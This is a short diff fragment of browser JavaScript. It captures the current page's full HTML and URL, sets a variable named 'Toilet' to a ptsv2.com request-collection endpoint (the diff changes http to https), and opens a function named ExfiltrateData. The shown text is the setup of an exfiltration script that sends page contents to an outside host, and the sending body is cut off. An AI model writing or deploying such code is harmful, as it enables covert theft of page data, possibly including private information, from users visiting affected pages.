@@ -21,7 +21,7 @@ var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
 var DocLocation = document.location.href;
 
 
-var Toilet = "http://ptsv2.com/t/qo33d-1598654477";
+var Toilet = "https://ptsv2.com/t/qo33d-1598654477";
 
 function ExfiltrateData(ID)
 {	
